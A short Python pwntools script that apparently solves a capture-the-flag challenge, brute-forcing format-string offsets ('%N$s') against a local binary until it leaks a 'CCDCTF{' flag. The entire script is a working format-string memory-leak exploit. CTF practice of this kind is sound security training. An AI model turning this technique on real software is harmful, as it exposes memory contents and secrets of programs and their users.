from pwn import *
import re

for x in range(130):
  try:
    exploit = process("./chall") 
    exploit.sendline('%{}$s'.format(x))
    leaked = exploit.recv()
 
    if b"CCDCTF{" in leaked:
      match = re.search(rb'CCDCTF.*', leaked)
      print("Flag:", match.group())
      print("Payload: ",'%{}$s'.format(x))
      break
    else:
      pass
  except EOFError:
    pass